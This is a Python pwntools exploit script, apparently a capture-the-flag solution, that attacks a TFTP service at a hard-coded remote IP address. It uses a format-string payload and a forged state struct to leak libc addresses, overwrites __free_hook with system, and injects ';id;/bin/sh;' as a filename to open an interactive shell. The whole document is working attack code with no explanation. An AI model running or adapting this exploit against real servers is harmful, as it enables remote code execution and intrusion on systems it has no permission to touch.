from pwn import *

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('/home/user/Downloads/libc.so.6', checksec=False)

READ_REQUEST = 1
ACK = 4

packet = ''.join([
    p16(READ_REQUEST, endian='big'),
    'ABCD\0',
    '%887d%000066$hn\x38\x40\x60\x00',
])

#r = process('strace -f -o log ./tftp', shell=True)
r = remote('52.68.37.204', 48763)

r.send(packet)

r.recvuntil('unknown')

packet = ''.join([
    p16(ACK, endian='big'),
    p16(0xffff, endian='big'),
    # fake state struct begins
    p64(READ_REQUEST),
    p64(0),
    'A' * 256,
    p64(0),
    p64(0),
    p64(0),
    p32(0),
    p32(0),
    p32(0),
    p32(0),
    p16(0xffff),
    p16(0),
    p32(0),
    p16(0x200),
    p16(0),
    p32(0),
    p64(0x603ee4),
    p64(0),
])

r.send(packet)

data = r.recvn(512)
leak = u64(data[149:157])
stdin = u64(data[341:349])
libc.address = leak - libc.symbols['read']

freehook = libc.symbols['__free_hook']

print hex(freehook)

packet = ''.join([
    p16(ACK, endian='big'),
    p16(0, endian='big'),
    # fake state struct begins
    p64(READ_REQUEST),
    p64(0),
    'A' * 256,
    p64(stdin),
    p64(0),
    p64(0),
    p32(0),
    p32(8),
    p32(0),
    p32(0),
    p16(0), #last_blk
    p16(0), #next_blk
    p32(0),
    p16(0x200),
    p16(0),
    p32(0),
    p64(0x400013 - 2),
    p64(freehook - 4),
])
r.send(packet)

import time
time.sleep(0.5)

r.send(p64(libc.symbols['system']))

time.sleep(0.5)

packet = ''.join([
    p16(READ_REQUEST, endian='big'),
    'ABCD\0',
    ';id;/bin/sh;\0',
])

r.send(packet)

r.interactive()